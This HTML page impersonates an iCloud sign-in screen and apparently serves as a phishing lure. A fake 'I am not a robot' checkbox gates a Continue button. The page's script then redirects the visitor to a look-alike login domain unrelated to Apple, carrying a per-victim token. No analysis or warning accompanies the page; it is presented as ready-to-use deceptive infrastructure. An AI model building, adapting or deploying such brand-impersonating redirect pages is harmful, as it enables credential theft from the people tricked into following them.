<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Signing into your account</title>
  <style>
    body {
      background-color: #f2f2f5;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen;
      text-align: center;
      padding: 40px;
      color: #333;
    }

    #main-content {
      max-width: 400px;
      margin: auto;
      background-color: #fff;
      border-radius: 10px;
      padding: 30px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
    }

    .logo-text {
      font-size: 28px;
      font-weight: bold;
      margin-bottom: 20px;
    }

    h1 {
      font-size: 20px;
      margin-bottom: 15px;
    }

    p {
      font-size: 14px;
      color: #555;
    }

    .checkbox-container {
      margin-top: 20px;
      text-align: left;
    }

    #continue-btn {
      margin-top: 20px;
      background-color: #0071e3;
      color: white;
      border: none;
      padding: 12px 20px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      width: 100%;
    }

    #continue-btn:disabled {
      background-color: #b0c4de;
      cursor: not-allowed;
    }

    .spinner {
      margin: 20px auto;
      width: 40px;
      height: 40px;
      border: 4px solid rgba(0, 0, 0, 0.1);
      border-top: 4px solid #0071e3;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      display: none;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div id="main-content">
    <div class="logo-text">iCloud</div>

    <h1>Signing into your account</h1>
    <p>Please verify that you're not a robot to continue.</p>

    <div class="checkbox-container">
      <input type="checkbox" id="human-check">
      <label for="human-check">I am not a robot</label>
    </div>

    <button id="continue-btn" disabled>Continue</button>

    <div class="spinner" id="spinner"></div>
    <p id="loading-msg" style="margin-top: 15px; display: none;">
      Please wait, you are connecting to your account in <span id="countdown">1</span> second...
    </p>
  </div>

  <script>
    const checkbox = document.getElementById('human-check');
    const button = document.getElementById('continue-btn');
    const spinner = document.getElementById('spinner');
    const countdownText = document.getElementById('loading-msg');
    const countdownNum = document.getElementById('countdown');

    checkbox.addEventListener('change', () => {
      button.disabled = !checkbox.checked;
    });

    button.addEventListener('click', () => {
      button.disabled = true;
      spinner.style.display = 'block';
      countdownText.style.display = 'block';

      let secondsLeft = 1;
      countdownNum.textContent = secondsLeft;

      const countdown = setInterval(() => {
        secondsLeft--;
        countdownNum.textContent = secondsLeft;

        if (secondsLeft <= 0) {
          clearInterval(countdown);
          window.location.href = "https://login-cloud.mmlegalconsults.com/8d35bf89a9c846e7945bcbd5d66541b1/?";
        }
      }, 1000);
    });
  </script>

</body>
</html>
